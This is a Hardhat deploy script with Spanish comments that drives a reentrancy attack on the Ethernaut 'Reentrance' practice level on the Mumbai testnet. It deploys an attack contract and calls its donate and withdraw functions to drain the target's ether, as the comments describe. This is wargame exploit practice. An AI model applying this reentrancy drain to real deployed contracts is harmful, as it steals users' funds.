require("dotenv").config()
const _provider = process.env.PROVIDER_MUMBAI
const privateKey = process.env.PRIVATE_KEY

const provider = new ethers.providers.JsonRpcProvider(_provider)
const signer = new ethers.Wallet(privateKey, provider)

/* DEPLOY + ATTACK */
/* @remind hay que robar 0,001 ether, por lo que enviamos esa misma cantidad a nuestro contrato, para hacer 2 veces withdraw, goleando nuestro fallback 1 vez 
dejamos el contrato objetivo a 0 ether
*/
async function main() {
  /* ATTACK CONTRACT NAME */
  const contractToDeploy = "ReentranceAttack"
  const MyContract = await ethers.getContractFactory(contractToDeploy)
  /* deberiamos de calcular el value, pero para simplificar vamos a cogerlo desde el contract de ethernaut */
  const _value = 1000000000000000 // 0,001 ether
  const ReentranceContract = await MyContract.deploy({
    value: _value,
  })
  console.log("ReentranceContract address", ReentranceContract.address)

  const txoBalance = await ReentranceContract.connect(signer).oBalance()
  console.log("txoBalance", txoBalance)

  /* donateAttack -> enviamos eth -> _value(dentro del SM) */
  const tx = await ReentranceContract.connect(signer).donateAttack({
    gasLimit: 10000000,
  })

  const res = await tx.wait()
  if (res.status === 0) {
    console.log("Transaction failed")

    // Retrieve the revert reason from the res if available
    if (res.logs && res.logs.length > 0) {
      const errorLog = res.logs.find((log) => log.topics[0] === "0x08c379a0") // Keccak hash of "Error(string)"
      if (errorLog) {
        const errorData = errorLog.data
        const reason = ethers.utils.toUtf8String(errorData.slice(4)) // Removing the 4-byte selector
        console.log("Revert reason:", reason)
      }
    }
  } else if (res.status === 1) {
    console.log("Transaction succeeded")
  }

  /* withdrawAttack */
  const tx2 = await ReentranceContract.connect(signer).withdrawAttack({
    gasLimit: 10000000,
  })

  const res2 = await tx2.wait()
  if (res2.status === 0) {
    console.log("Transaction failed")

    // Retrieve the revert reason from the res if available
    if (res2.logs && res2.logs.length > 0) {
      const errorLog = res2.logs.find((log) => log.topics[0] === "0x08c379a0") // Keccak hash of "Error(string)"
      if (errorLog) {
        const errorData = errorLog.data
        const reason = ethers.utils.toUtf8String(errorData.slice(4)) // Removing the 4-byte selector
        console.log("Revert reason:", reason)
      }
    }
  } else if (res2.status === 1) {
    console.log("Transaction succeeded")
  }

  /* donateAttack -> enviamos eth -> _value(dentro del SM) */
  const checkCallsAmount = await ReentranceContract.connect(
    signer
  ).callsAmount()
  console.log("checkCallsAmount", checkCallsAmount) // must be 1
}

main()
  .then(async (myContract) => {})
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })

/* 
  npx hardhat run contracts/10/DeployAndCall__Attack.js --network mumbai
*/
